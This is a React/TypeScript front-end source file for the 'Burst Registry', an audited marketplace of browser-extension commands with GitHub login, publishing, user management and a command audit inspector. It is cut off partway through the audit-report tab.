import { useEffect, useState } from 'react';
import type { BurstCommand } from '@/src/lib/commands';
import { sampleManifestValidationResults } from '@/src/lib/manifest';
import { analyzeScriptCode } from '@/src/lib/staticAnalysis';
import logoUrl from '@/assets/logo.svg';
import {
  getAuthConfig,
  getCurrentUser,
  getGithubLoginUrl,
  getRegistryCommands,
  getRegistryCommand,
  getAuditReport,
  getPublisherProfile,
  getRegistryUsers,
  loginPreviewUser,
  logout,
  publishCommand,
  updateRegistryUser,
  AuditReport,
  RegistryAuthConfig,
  PublisherProfile,
  RegistrySessionUser,
  registryCommandsData,
  mockProfiles,
  mockPublisherProfiles,
} from '@/src/lib/registryApi';

const navItems = ['Discover', 'Publish', 'Users', 'Audits', 'Settings'];

const trustCopy: Record<BurstCommand['trustLevel'], string> = {
  verified: 'Verified',
  reviewed: 'Reviewed',
  community: 'Community',
  local: 'Local',
};

const riskCopy: Record<BurstCommand['risk'], string> = {
  low: 'Low',
  medium: 'Medium',
  high: 'High',
};

export function RegistryApp() {
  const [authLoading, setAuthLoading] = useState(true);
  const [authConfig, setAuthConfig] = useState<RegistryAuthConfig | null>(null);
  const [navTab, setNavTab] = useState<'Discover' | 'Publish' | 'Users' | 'Audits' | 'Settings'>('Discover');
  const [publishSuccessToast, setPublishSuccessToast] = useState<string | null>(null);

  const [query, setQuery] = useState('');
  const [commands, setCommands] = useState<BurstCommand[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeCommandId, setActiveCommandId] = useState<string | null>(null);

  const [activeCommand, setActiveCommand] = useState<BurstCommand | null>(null);
  const [activeAuditReport, setActiveAuditReport] = useState<AuditReport | null>(null);
  const [activePublisherProfile, setActivePublisherProfile] = useState<PublisherProfile | null>(null);
  const [inspectorLoading, setInspectorLoading] = useState(false);
  const [inspectorTab, setInspectorTab] = useState<'details' | 'audit' | 'publisher'>('details');

  const [currentUser, setCurrentUser] = useState<RegistrySessionUser>(mockProfiles[0]);
  const [installedCommandIds, setInstalledCommandIds] = useState<string[]>([]);
  const [pinnedCommandIds, setPinnedCommandIds] = useState<string[]>([]);

  useEffect(() => {
    let active = true;

    async function bootstrap() {
      try {
        const [config, user] = await Promise.all([getAuthConfig(), getCurrentUser()]);
        if (!active) return;
        setAuthConfig(config);
        setCurrentUser(user);
      } catch (err) {
        if (!active) return;
        console.error('Failed to bootstrap registry auth state:', err);
        setAuthConfig({ githubEnabled: false, previewEnabled: true });
        setCurrentUser(mockProfiles[0]);
      } finally {
        if (active) setAuthLoading(false);
      }
    }

    void bootstrap();

    return () => {
      active = false;
    };
  }, []);

  const validManifests = sampleManifestValidationResults.filter((sample) => sample.result.ok).length;
  const isGuest = currentUser.handle === 'guest';
  const dashboardCopy: Record<
    'Discover' | 'Publish' | 'Users' | 'Audits' | 'Settings',
    { title: string; description: string }
  > = {
    Discover: {
      title: 'Discover commands and inspect trust signals',
      description: 'Search the registry, compare publishers, and keep the install path visible before anything reaches the extension.',
    },
    Publish: {
      title: 'Publish with an explicit security review',
      description: 'Draft a command, declare its capabilities, and validate the audit result before it gets indexed.',
    },
    Users: {
      title: 'Review publisher identity and account roles',
      description: 'Inspect publisher records, verify source claims, and keep the account graph readable for moderators.',
    },
    Audits: {
      title: 'Study the static audit pipeline',
      description: 'Use the sandbox to see why a command passes, warns, or fails before the registry publishes it.',
    },
    Settings: {
      title: 'Tune the registry workspace',
      description: 'Control the desktop feel of the registry shell and keep the operator environment predictable.',
    },
  };
  const dashboardState = dashboardCopy[navTab];
  const currentGithubLogin = 'githubLogin' in currentUser ? currentUser.githubLogin : undefined;
  const dashboardMetrics: Record<
    'Discover' | 'Publish' | 'Users' | 'Audits' | 'Settings',
    Array<{ label: string; value: string }>
  > = {
    Discover: [
      { label: 'Commands', value: registryCommandsData.length.toString() },
      { label: 'Audited', value: registryCommandsData.filter((command) => command.trustLevel !== 'community').length.toString() },
      { label: 'Sensitive', value: registryCommandsData.filter((command) => command.risk === 'high').length.toString() },
    ],
    Publish: [
      { label: 'Verified sources', value: currentUser.handle === 'guest' ? '0' : currentUser.verifiedSources.length.toString() },
      { label: 'Role', value: currentUser.role || 'publisher' },
      { label: 'Audit checks', value: '5' },
    ],
    Users: [
      { label: 'Publishers', value: Object.keys(mockPublisherProfiles).length.toString() },
      { label: 'Admins', value: Object.values(mockPublisherProfiles).filter((profile) => profile.role === 'admin').length.toString() },
      { label: 'Verified', value: Object.values(mockPublisherProfiles).filter((profile) => profile.verified).length.toString() },
    ],
    Audits: [
      { label: 'Pass', value: registryCommandsData.filter((command) => command.trustLevel === 'verified').length.toString() },
      { label: 'Review', value: registryCommandsData.filter((command) => command.trustLevel === 'reviewed').length.toString() },
      { label: 'Warnings', value: registryCommandsData.filter((command) => command.risk !== 'low').length.toString() },
    ],
    Settings: [
      { label: 'Theme', value: 'Adaptive' },
      { label: 'Session', value: currentUser.handle === 'guest' ? 'Guest' : 'Signed in' },
      { label: 'Storage', value: 'Local sync' },
    ],
  };
  const workspaceMetrics = dashboardMetrics[navTab];

  useEffect(() => {
    if (isGuest) {
      setCommands([]);
      setActiveCommandId(null);
      setLoading(false);
      return;
    }

    let active = true;
    setLoading(true);

    async function fetchCommands() {
      try {
        const results = await getRegistryCommands(query);
        if (!active) return;
        setCommands(results);
        if (results.length > 0) {
          if (!activeCommandId || !results.some((c) => c.id === activeCommandId)) {
            setActiveCommandId(results[0].id);
          }
        } else {
          setActiveCommandId(null);
        }
      } catch (err) {
        if (!active) return;
        console.error('Failed to fetch registry commands:', err);
      } finally {
        if (active) setLoading(false);
      }
    }

    void fetchCommands();

    return () => {
      active = false;
    };
  }, [isGuest, query]);

  useEffect(() => {
    if (isGuest) {
      setActiveCommand(null);
      setActiveAuditReport(null);
      setActivePublisherProfile(null);
      return;
    }

    if (!activeCommandId) {
      setActiveCommand(null);
      setActiveAuditReport(null);
      setActivePublisherProfile(null);
      return;
    }

    const commandId = activeCommandId;
    let active = true;
    setInspectorLoading(true);
    setInspectorTab('details');

    async function fetchDetails() {
      try {
        const cmd = await getRegistryCommand(commandId);
        if (!active) return;
        if (cmd) {
          setActiveCommand(cmd);
          const [audit, profile] = await Promise.all([
            getAuditReport(cmd.id, cmd.version || '1.0.0'),
            getPublisherProfile(cmd.publisher.handle),
          ]);
          if (!active) return;
          setActiveAuditReport(audit ?? null);
          setActivePublisherProfile(profile ?? null);
        } else {
          setActiveCommand(null);
          setActiveAuditReport(null);
          setActivePublisherProfile(null);
        }
      } catch (err) {
        if (!active) return;
        console.error('Failed to fetch command details:', err);
      } finally {
        if (active) setInspectorLoading(false);
      }
    }

    void fetchDetails();

    return () => {
      active = false;
    };
  }, [activeCommandId, isGuest]);

  useEffect(() => {
    const handler = (event: MessageEvent) => {
      if (event.source !== window || !event.data || typeof event.data !== 'object') return;
      const { type } = event.data;

      if (type === 'burst:installed-commands-response') {
        setInstalledCommandIds(event.data.installedIds || []);
        setPinnedCommandIds(event.data.pinnedIds || []);
      }
    };

    window.addEventListener('message', handler);
    window.postMessage({ type: 'burst:get-installed-commands' }, '*');

    return () => {
      window.removeEventListener('message', handler);
    };
  }, []);

  const handleGitHubLogin = async () => {
    const loginUrl = await getGithubLoginUrl('/dashboard');
    window.location.assign(loginUrl);
  };

  const handlePreviewLogin = async (profile: typeof mockProfiles[number]) => {
    try {
      const res = await loginPreviewUser(profile.handle);
      if (res.ok) {
        const profileDetails = mockPublisherProfiles[profile.handle];
        setCurrentUser(
          profileDetails
            ? profileDetails
            : {
                name: res.user.name,
                handle: res.user.handle,
                avatarInitials: res.user.avatarInitials,
                verified: false,
                verifiedSources: [],
                publishedCommandsCount: 0,
                joinedAt: new Date().toISOString().slice(0, 10),
                bio: '',
                role: profile.role,
              }
        );
        setNavTab('Discover');
      }
    } catch (err) {
      console.error('Failed to switch preview profile:', err);
    }
  };

  const handleLogout = async () => {
    try {
      await logout();
    } catch (err) {
      console.error('Failed to logout:', err);
    } finally {
      setCurrentUser(mockProfiles[0]);
      setNavTab('Discover');
      setPublishSuccessToast(null);
    }
  };

  const handleInstall = (command: BurstCommand) => {
    window.postMessage({ type: 'burst:install-command', command }, '*');
  };

  const handleUninstall = (commandId: string) => {
    window.postMessage({ type: 'burst:uninstall-command', commandId }, '*');
  };

  const handlePin = (commandId: string) => {
    window.postMessage({ type: 'burst:pin-command', commandId }, '*');
  };

  const handleUnpin = (commandId: string) => {
    window.postMessage({ type: 'burst:unpin-command', commandId }, '*');
  };

  if (authLoading) {
    return (
      <LandingPage
        authLoading
        authConfig={authConfig}
        onGitHubLogin={handleGitHubLogin}
        onPreviewLogin={handlePreviewLogin}
      />
    );
  }

  if (isGuest) {
    return (
      <LandingPage
        authConfig={authConfig}
        onGitHubLogin={handleGitHubLogin}
        onPreviewLogin={handlePreviewLogin}
      />
    );
  }

  return (
    <div className="registry-shell">
      <aside className="sidebar" aria-label="Registry navigation">
        <div className="brand">
          <img className="brand-logo-img" src={logoUrl} alt="Burst Logo" />
          <div>
            <strong>Burst</strong>
            <em>Registry</em>
          </div>
        </div>

        <div className="auth-panel auth-panel--signed-in">
          <strong>Signed in</strong>
          <div className="auth-profile-select">
            <div className="auth-profile-btn is-active">
              <span className="profile-avatar">{currentUser.avatarInitials}</span>
              <span className="profile-details">
                <span className="profile-name">{currentUser.name}</span>
                <span className="profile-handle">
                  {currentUser.handle} {currentUser.githubLogin ? `• ${currentUser.githubLogin}` : ''}
                </span>
              </span>
            </div>
          </div>
          <div className="auth-panel-meta">
            <span className={`role-badge role-${currentUser.role || 'publisher'}`}>{currentUser.role || 'publisher'}</span>
            <button className="logout-btn" type="button" onClick={() => void handleLogout()}>
              Log out
            </button>
          </div>
        </div>

        <nav>
          {navItems.map((item) => (
            <button
              className={item === navTab ? 'is-active' : ''}
              type="button"
              key={item}
              onClick={() => {
                setNavTab(item as typeof navTab);
                setPublishSuccessToast(null);
              }}
            >
              {item}
            </button>
          ))}
        </nav>

        <div className="sidebar-note">
          <strong>Security model</strong>
          <span>Audit labels inform discovery. Source review stays yours.</span>
        </div>
      </aside>

      <main className="registry-main">
        {publishSuccessToast && (
          <div className="publish-success-toast">
            <span>{publishSuccessToast}</span>
            <button className="close-toast-btn" onClick={() => setPublishSuccessToast(null)}>×</button>
          </div>
        )}

        <section className="dashboard-banner" aria-label="Registry workspace summary">
          <div className="dashboard-banner-copy">
            <p className="eyebrow">Registry workspace</p>
            <h1>{dashboardState.title}</h1>
            <p>{dashboardState.description}</p>

            <div className="dashboard-banner-meta">
              <span>{currentUser.name}</span>
              <span>{currentUser.handle}</span>
              <span>{currentUser.role || 'publisher'}</span>
              <span>{authConfig?.githubEnabled ? 'GitHub OAuth enabled' : 'Preview login enabled'}</span>
            </div>
          </div>

          <div className="dashboard-banner-card">
            <div className="dashboard-banner-session">
              <span className="profile-avatar">{currentUser.avatarInitials}</span>
              <div>
                <strong>{currentUser.name}</strong>
                <p>{currentGithubLogin ? `@${currentGithubLogin}` : currentUser.handle}</p>
              </div>
            </div>

            <div className="dashboard-banner-metrics" aria-label="Workspace metrics">
              {workspaceMetrics.map((metric) => (
                <div key={metric.label} className="dashboard-metric">
                  <span>{metric.label}</span>
                  <strong>{metric.value}</strong>
                </div>
              ))}
            </div>

            <div className="dashboard-banner-actions">
              {navTab !== 'Discover' && (
                <button type="button" className="hero-button hero-button-secondary" onClick={() => setNavTab('Discover')}>
                  Go to Discover
                </button>
              )}
              {navTab !== 'Publish' && (
                <button type="button" className="hero-button hero-button-primary" onClick={() => setNavTab('Publish')}>
                  Open Publish
                </button>
              )}
              {navTab === 'Discover' && (
                <button type="button" className="hero-button hero-button-primary" onClick={() => setNavTab('Users')}>
                  Review users
                </button>
              )}
            </div>
          </div>
        </section>

        {navTab === 'Discover' && (
          <>
            <header className="topbar">
              <label className="search">
                <span>Search commands</span>
                <input
                  value={query}
                  onChange={(event) => setQuery(event.target.value)}
                  placeholder="Search website, publisher, permission, or use case"
                />
              </label>
              <button
                className="publish-button"
                type="button"
                onClick={() => {
                  setNavTab('Publish');
                  setPublishSuccessToast(null);
                }}
              >
                Publish use case
              </button>
            </header>

            <section className="summary-grid" aria-label="Registry summary">
              <SummaryStat label="Commands" value={registryCommandsData.length.toString()} />
              <SummaryStat label="Manifests" value={`${validManifests}/${sampleManifestValidationResults.length}`} />
              <SummaryStat
                label="Audited"
                value={registryCommandsData.filter((command) => command.trustLevel === 'verified' || command.trustLevel === 'reviewed').length.toString()}
              />
              <SummaryStat label="Sensitive" value={registryCommandsData.filter((command) => command.risk === 'high').length.toString()} />
            </section>

            <section className="workspace">
              <div className="command-list" aria-label="Registry commands">
                <div className="list-header">
                  <div>
                    <h1>Discover commands</h1>
                    <p>Find actions that match the current website, then inspect trust signals before installing.</p>
                  </div>
                  <span>{commands.length} results</span>
                </div>

                <div className="table-head">
                  <span>Command</span>
                  <span>Website</span>
                  <span>Trust</span>
                  <span>Risk</span>
                  <span>Usage</span>
                </div>

                {loading ? (
                  <div className="registry-loading">
                    <div className="spinner"></div>
                    <span>Searching registry...</span>
                  </div>
                ) : commands.length > 0 ? (
                  commands.map((command) => (
                    <button
                      className={`command-row ${activeCommandId === command.id ? 'is-selected' : ''}`}
                      key={command.id}
                      type="button"
                      onClick={() => setActiveCommandId(command.id)}
                    >
                      <span className="command-title">
                        <strong style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                          {command.title}
                          {installedCommandIds.includes(command.id) && (
                            <span className="status-indicator installed-indicator" title="Installed">✓</span>
                          )}
                          {pinnedCommandIds.includes(command.id) && (
                            <span className="status-indicator pinned-indicator" title="Pinned">📌</span>
                          )}
                        </strong>
                        <em>{command.publisher.name} {command.publisher.handle}</em>
                      </span>
                      <span>{command.website}</span>
                      <span className={`trust-badge trust-${command.trustLevel}`}>{trustCopy[command.trustLevel]}</span>
                      <span className={`risk-badge risk-${command.risk}`}>{riskCopy[command.risk]}</span>
                      <span>{command.installs.toLocaleString()} installs</span>
                    </button>
                  ))
                ) : (
                  <div className="empty-registry">
                    <strong>No registry commands match</strong>
                    <span>Try searching for a different website matching pattern or publisher name.</span>
                  </div>
                )}
              </div>

              {activeCommand ? (
                <CommandInspector
                  command={activeCommand}
                  auditReport={activeAuditReport}
                  publisherProfile={activePublisherProfile}
                  loading={inspectorLoading}
                  activeTab={inspectorTab}
                  setActiveTab={setInspectorTab}
                  installedCommandIds={installedCommandIds}
                  pinnedCommandIds={pinnedCommandIds}
                  onInstall={handleInstall}
                  onUninstall={handleUninstall}
                  onPin={handlePin}
                  onUnpin={handleUnpin}
                />
              ) : (
                <EmptyInspector />
              )}
            </section>
          </>
        )}

        {navTab === 'Publish' && (
          <PublishPanel
            currentUser={currentUser}
            onPublishSuccess={(newCmd) => {
              setCommands((prev) => [newCmd, ...prev]);
              setActiveCommandId(newCmd.id);
              setNavTab('Discover');
              setPublishSuccessToast(`Successfully published "${newCmd.title}"!`);
            }}
            setNavTab={setNavTab}
          />
        )}

        {navTab === 'Users' && <UsersPanel currentUser={currentUser} />}

        {navTab === 'Audits' && <AuditsPanel />}

        {navTab === 'Settings' && <SettingsPanel />}
      </main>
    </div>
  );
}

function LandingPage({
  authLoading = false,
  authConfig,
  onGitHubLogin,
  onPreviewLogin,
}: {
  authLoading?: boolean;
  authConfig: RegistryAuthConfig | null;
  onGitHubLogin: () => Promise<void>;
  onPreviewLogin: (profile: typeof mockProfiles[number]) => Promise<void>;
}) {
  const featuredCommands = registryCommandsData.slice(0, 3);
  const verifiedCount = registryCommandsData.filter((command) => command.trustLevel === 'verified').length;
  const reviewedCount = registryCommandsData.filter((command) => command.trustLevel === 'reviewed' || command.trustLevel === 'verified').length;
  const commandCount = registryCommandsData.length;
  const githubEnabled = authConfig?.githubEnabled ?? false;

  return (
    <div className="landing-shell">
      <header className="landing-hero">
        <div className="landing-brand">
          <img className="brand-logo-img" src={logoUrl} alt="Burst Logo" />
          <div>
            <strong>Burst</strong>
            <em>Registry</em>
          </div>
        </div>

        <div className="landing-hero-copy">
          <p className="eyebrow">Audited command registry</p>
          <h1>Ship safe browser commands with GitHub-backed identity.</h1>
          <p>
            Burst Registry combines a public command marketplace, authenticated publisher dashboard, and user management so the
            extension team can review, publish, and trust scripts from one place.
          </p>

          <div className="landing-actions">
            <button className="hero-button hero-button-primary" type="button" onClick={() => void onGitHubLogin()} disabled={!githubEnabled || authLoading}>
              {githubEnabled ? 'Continue with GitHub' : 'GitHub login unavailable'}
            </button>
            <a className="hero-button hero-button-secondary" href="#featured-commands">
              Browse featured commands
            </a>
          </div>

          <div className="landing-meta">
            <span>{commandCount} public commands</span>
            <span>{verifiedCount} verified publishers</span>
            <span>{reviewedCount} audited entries</span>
          </div>
        </div>

        <div className="landing-sidecard">
          <span className="landing-sidecard-label">Login mode</span>
          <strong>{githubEnabled ? 'GitHub OAuth' : 'Preview mode'}</strong>
          <p>
            {githubEnabled
              ? 'Production sign-in uses GitHub OAuth and stores the session in Cloudflare Workers.'
              : 'GitHub secrets are not configured in this environment, so preview accounts remain available for local work.'}
          </p>

          <div className="preview-login-grid">
            {mockProfiles
              .filter((profile) => profile.handle !== 'guest')
              .map((profile) => (
                <button key={profile.handle} type="button" className="preview-login-card" onClick={() => void onPreviewLogin(profile)}>
                  <span className="profile-avatar">{profile.avatarInitials}</span>
                  <span>
                    <strong>{profile.name}</strong>
                    <em>{profile.handle}</em>
                  </span>
                </button>
              ))}
          </div>
        </div>
      </header>

      <section className="landing-surface">
        <div className="landing-feature-grid">
          <article className="feature-card">
            <strong>Landing page</strong>
            <p>Public entry point for the registry with a clear trust story and a fast path into GitHub auth.</p>
          </article>
          <article className="feature-card">
            <strong>Logged-in dashboard</strong>
            <p>Discover, publish, audit, and manage users from a single authenticated workspace.</p>
          </article>
          <article className="feature-card">
            <strong>User management</strong>
            <p>Review publisher profiles, role assignments, verified sources, and identity metadata.</p>
          </article>
        </div>

        <div className="featured-commands" id="featured-commands">
          <div className="section-heading">
            <h2>Featured commands</h2>
            <p>Public examples that show the trust labels, permissions, and publisher identity model.</p>
          </div>
          <div className="featured-command-list">
            {featuredCommands.map((command) => (
              <div key={command.id} className="featured-command-card">
                <div>
                  <strong>{command.title}</strong>
                  <p>{command.description}</p>
                </div>
                <div className="featured-command-meta">
                  <span className={`trust-badge trust-${command.trustLevel}`}>{trustCopy[command.trustLevel]}</span>
                  <span className={`risk-badge risk-${command.risk}`}>{riskCopy[command.risk]}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>
    </div>
  );
}

function UsersPanel({
  currentUser,
  onCurrentUserUpdate,
}: {
  currentUser: RegistrySessionUser;
  onCurrentUserUpdate: (user: PublisherProfile) => void;
}) {
  const [query, setQuery] = useState('');
  const [users, setUsers] = useState<PublisherProfile[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedHandle, setSelectedHandle] = useState<string>('');
  const [saving, setSaving] = useState(false);
  const [notice, setNotice] = useState<string | null>(null);
  const [draft, setDraft] = useState({
    name: '',
    bio: '',
    verified: false,
    verifiedSources: '',
    role: 'publisher' as 'admin' | 'publisher' | 'member',
  });

  const selectedUser = users.find((user) => user.handle === selectedHandle) ?? null;
  const canEditAll = currentUser.handle !== 'guest' && currentUser.role === 'admin';
  const canEditSelected = Boolean(selectedUser) && (canEditAll || selectedUser?.handle === currentUser.handle);
  const selectedRole = selectedUser?.role ?? 'publisher';
  const selectedAccess = canEditAll ? 'Admin access' : canEditSelected ? 'Self edit' : 'Read only';

  useEffect(() => {
    let active = true;
    setLoading(true);

    async function fetchUsers() {
      try {
        const results = await getRegistryUsers(query);
        if (!active) return;
        setUsers(results);
        setSelectedHandle((prev) => {
          if (prev && results.some((user) => user.handle === prev)) {
            return prev;
          }
          return results[0]?.handle || '';
        });
      } catch (err) {
        if (!active) return;
        console.error('Failed to fetch registry users:', err);
      } finally {
        if (active) setLoading(false);
      }
    }

    void fetchUsers();

    return () => {
      active = false;
    };
  }, [query]);

  useEffect(() => {
    if (!selectedUser) return;
    setDraft({
      name: selectedUser.name,
      bio: selectedUser.bio,
      verified: selectedUser.verified,
      verifiedSources: selectedUser.verifiedSources.join('\n'),
      role: selectedUser.role ?? 'publisher',
    });
  }, [selectedUser?.handle]);

  const handleSave = async () => {
    if (!selectedUser) return;
    setSaving(true);
    setNotice(null);

    try {
      const updated = await updateRegistryUser(selectedUser.handle, {
        name: draft.name.trim(),
        bio: draft.bio.trim(),
        verified: draft.verified,
        verifiedSources: draft.verifiedSources
          .split('\n')
          .map((source) => source.trim())
          .filter(Boolean),
        role: draft.role,
      });

      setUsers((prev) => prev.map((user) => (user.handle === updated.handle ? updated : user)));
      if (updated.handle === currentUser.handle) {
        onCurrentUserUpdate(updated);
      }
      setNotice(`Saved ${updated.handle}`);
    } catch (err) {
      setNotice(err instanceof Error ? err.message : 'Failed to save user');
    } finally {
      setSaving(false);
    }
  };

  return (
    <div className="users-panel">
      <div className="dashboard-header">
        <h1>User management</h1>
        <p>Review publisher identity, edit profile metadata, and manage verified-source claims.</p>
      </div>

      <div className="users-workspace">
        <section className="users-directory">
          <div className="users-directory-head">
            <label className="search">
              <span>Search users</span>
              <input value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search name, handle, source, or bio" />
            </label>
            <span>{users.length} users</span>
          </div>

          {loading ? (
            <div className="registry-loading">
              <div className="spinner"></div>
              <span>Loading users...</span>
            </div>
          ) : (
            <div className="user-list">
              {users.map((user) => (
                <button
                  key={user.handle}
                  type="button"
                  className={`user-row ${selectedHandle === user.handle ? 'is-selected' : ''}`}
                  onClick={() => setSelectedHandle(user.handle)}
                >
                  <span className="profile-avatar">{user.avatarInitials}</span>
                  <span className="user-row-copy">
                    <strong>
                      {user.name}
                      <span className={`role-badge role-${user.role || 'publisher'}`}>{user.role || 'publisher'}</span>
                    </strong>
                    <em>{user.handle}</em>
                    <span>{user.publishedCommandsCount} commands</span>
                  </span>
                </button>
              ))}
            </div>
          )}
        </section>

        <section className="user-detail">
          {selectedUser ? (
            <>
              <div className="user-detail-header">
                <div className="publisher-profile-card user-profile-hero">
                  <div className="publisher-avatar-large">{selectedUser.avatarInitials}</div>
                  <div className="publisher-profile-info">
                    <h3>{selectedUser.name}</h3>
                    <span className="publisher-handle">{selectedUser.handle}</span>
                    <div className="user-profile-tags">
                      <span className={`role-badge role-${selectedRole}`}>{selectedRole}</span>
                      <span className={`user-access-badge access-${canEditAll ? 'admin' : canEditSelected ? 'self' : 'read'}`}>{selectedAccess}</span>
                      <span className="user-verified-count">{selectedUser.verifiedSources.length} verified sources</span>
                    </div>
                  </div>
                </div>
                <div className="user-detail-summary">
                  <div>
                    <span>Published commands</span>
                    <strong>{selectedUser.publishedCommandsCount}</strong>
                  </div>
                  <div>
                    <span>Member since</span>
                    <strong>{new Date(selectedUser.joinedAt).toLocaleDateString(undefined, { year: 'numeric', month: 'short' })}</strong>
                  </div>
                  <div>
                    <span>Verified</span>
                    <strong>{selectedUser.verified ? 'Yes' : 'No'}</strong>
                  </div>
                </div>
              </div>

              <div className="user-management-grid">
                <div className="user-management-column">
                  <label className="form-field">
                    <span>Display name</span>
                    <input
                      value={draft.name}
                      onChange={(event) => setDraft((prev) => ({ ...prev, name: event.target.value }))}
                      disabled={!canEditSelected}
                    />
                  </label>

                  <label className="form-field">
                    <span>Role</span>
                    <select
                      value={draft.role}
                      onChange={(event) => setDraft((prev) => ({ ...prev, role: event.target.value as typeof draft.role }))}
                      disabled={!canEditAll}
                    >
                      <option value="publisher">Publisher</option>
                      <option value="member">Member</option>
                      <option value="admin">Admin</option>
                    </select>
                  </label>

                  <label className="form-field form-field--full">
                    <span>Bio</span>
                    <textarea
                      rows={4}
                      value={draft.bio}
                      onChange={(event) => setDraft((prev) => ({ ...prev, bio: event.target.value }))}
                      disabled={!canEditSelected}
                    />
                  </label>

                  <label className="form-field form-field--full">
                    <span>Verified sources, one per line</span>
                    <textarea
                      rows={4}
                      value={draft.verifiedSources}
                      onChange={(event) => setDraft((prev) => ({ ...prev, verifiedSources: event.target.value }))}
                      disabled={!canEditAll && selectedUser.handle !== currentUser.handle}
                    />
                  </label>

                  <label className="permission-checkbox-label user-verify-toggle">
                    <input
                      type="checkbox"
                      checked={draft.verified}
                      onChange={() => setDraft((prev) => ({ ...prev, verified: !prev.verified }))}
                      disabled={!canEditAll}
                    />
                    <span>Verified publisher</span>
                  </label>
                </div>

                <div className="user-management-column user-context-panel">
                  <div className="publisher-section">
                    <h3>Identity context</h3>
                    <div className="user-context-list">
                      <div>
                        <span>GitHub login</span>
                        <strong>{selectedUser.githubLogin ?? 'Not linked'}</strong>
                      </div>
                      <div>
                        <span>Profile URL</span>
                        <strong>{selectedUser.profileUrl ?? 'Unavailable'}</strong>
                      </div>
                      <div>
                        <span>Primary access</span>
                        <strong>{selectedAccess}</strong>
                      </div>
                    </div>
                  </div>

                  <div className="publisher-section">
                    <h3>Account facts</h3>
                    <div className="publisher-stats-grid">
                      <div>
                        <strong>{selectedUser.publishedCommandsCount}</strong>
                        <span>Published commands</span>
                      </div>
                      <div>
                        <strong>{new Date(selectedUser.joinedAt).toLocaleDateString(undefined, { year: 'numeric', month: 'short' })}</strong>
                        <span>Member since</span>
                      </div>
                    </div>
                  </div>

                  <div className="publisher-section">
                    <h3>Verification state</h3>
                    <div className="user-verification-note">
                      <strong>{selectedUser.verified ? 'Verified publisher' : 'Community publisher'}</strong>
                      <p>
                        {selectedUser.verified
                          ? 'This account is eligible for verified-source publishing and should stay tightly reviewed.'
                          : 'This account can still publish, but the identity record should be treated as a community profile.'}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {notice && <div className="form-error-banner user-notice">{notice}</div>}

              <div className="form-actions user-form-actions">
                <button className="btn-primary" type="button" onClick={() => void handleSave()} disabled={saving || !canEditSelected}>
                  {saving ? 'Saving...' : 'Save changes'}
                </button>
              </div>
            </>
          ) : (
            <div className="empty-registry">
              <strong>No users found</strong>
              <span>Try a different search term.</span>
            </div>
          )}
        </section>
      </div>
    </div>
  );
}

function SummaryStat({ label, value }: { label: string; value: string }) {
  return (
    <div className="summary-stat">
      <strong>{value}</strong>
      <span>{label}</span>
    </div>
  );
}

function EmptyInspector() {
  return (
    <aside className="inspector empty-inspector" aria-label="Registry status">
      <div className="inspector-head">
        <img className="brand-logo-img" src={logoUrl} alt="Burst Logo" />
        <div>
          <h2>Registry pending</h2>
          <p>Select a command from the list on the left to inspect its details, security audits, and publisher profiles.</p>
        </div>
      </div>
      <div className="manifest-report">
        <h3>Manifest samples</h3>
        {sampleManifestValidationResults.map((sample) => (
          <div key={sample.id}>
            <strong>{sample.id}</strong>
            <span className={sample.result.ok ? 'is-valid' : 'is-invalid'}>
              {sample.result.ok ? 'Valid' : sample.result.errors.join(', ')}
            </span>
          </div>
        ))}
      </div>
    </aside>
  );
}

function CommandInspector({
  command,
  auditReport,
  publisherProfile,
  loading,
  activeTab,
  setActiveTab,
  installedCommandIds,
  pinnedCommandIds,
  onInstall,
  onUninstall,
  onPin,
  onUnpin,
}: {
  command: BurstCommand;
  auditReport: AuditReport | null;
  publisherProfile: PublisherProfile | null;
  loading: boolean;
  activeTab: 'details' | 'audit' | 'publisher';
  setActiveTab: (tab: 'details' | 'audit' | 'publisher') => void;
  installedCommandIds: string[];
  pinnedCommandIds: string[];
  onInstall: (command: BurstCommand) => void;
  onUninstall: (commandId: string) => void;
  onPin: (commandId: string) => void;
  onUnpin: (commandId: string) => void;
}) {
  if (loading) {
    return (
      <aside className="inspector is-loading" aria-label="Loading details">
        <div className="inspector-spinner-container">
          <div className="spinner"></div>
          <span>Loading details...</span>
        </div>
      </aside>
    );
  }

  return (
    <aside className="inspector" aria-label="Selected command audit details">
      <div className="inspector-head">
        <span className="publisher-avatar">{command.publisher.avatarInitials}</span>
        <div>
          <h2>{command.title}</h2>
          <p>{command.description}</p>
        </div>
      </div>

      <div className="inspector-tabs" role="tablist">
        <button
          className={activeTab === 'details' ? 'is-active' : ''}
          role="tab"
          aria-selected={activeTab === 'details'}
          onClick={() => setActiveTab('details')}
          type="button"
        >
          Details
        </button>
        <button
          className={activeTab === 'audit' ? 'is-active' : ''}
          role="tab"
          aria-selected={activeTab === 'audit'}
          onClick={() => setActiveTab('audit')}
          type="button"
        >
          Audit Report
        </button>
        <button
          className={activeTab === 'publisher' ? 'is-active' : ''}
          role="tab"
          aria-selected={activeTab === 'publisher'}
          onClick={() => setActiveTab('publisher')}
          type="button"
        >
          Publisher
        </button>
      </div>

      {activeTab === 'details' && (
        <div className="tab-content details-tab">
          <div className="audit-strip">
            <span className={`trust-badge trust-${command.trustLevel}`}>{trustCopy[command.trustLevel]}</span>
            <span className={`risk-badge risk-${command.risk}`}>{riskCopy[command.risk]} risk</span>
          </div>

          <dl className="detail-list">
            <div>
              <dt>Publisher</dt>
              <dd>{command.publisher.name} <span>{command.publisher.handle}</span></dd>
            </div>
            <div>
              <dt>Source</dt>
              <dd>
                <a href={command.sourceUrl} target="_blank" rel="noopener noreferrer">
                  {command.sourceUrl.replace('https://github.com/', '')}
                </a>
              </dd>
            </div>
            <div>
              <dt>Website match</dt>
              <dd>{command.matchPatterns.join(', ')}</dd>
            </div>
          </dl>

          <div className="permissions">
            <h3>Requested permissions</h3>
            {command.permissions.map((permission) => (
              <span key={permission}>{permission}</span>
            ))}
          </div>
        </div>
      )}

      {activeTab === 'audit' && (
        <div className="tab-content audit-tab">
          {auditReport ? (
            <>
              <div className="audit-summary-card">
                <div className="audit-summary-header">
                  <h3>Audit Summary</h3>
                  <span className={`audit-status-badge status-${auditReport.status}`}>
                    {auditReport.status.toUpperCase()}
                  </span>
                </div>
                <p className="audit-summary-text">{auditReport.summary}</p>
                <div className="audit-meta">
                  <span>Version: {auditReport.version}</span>
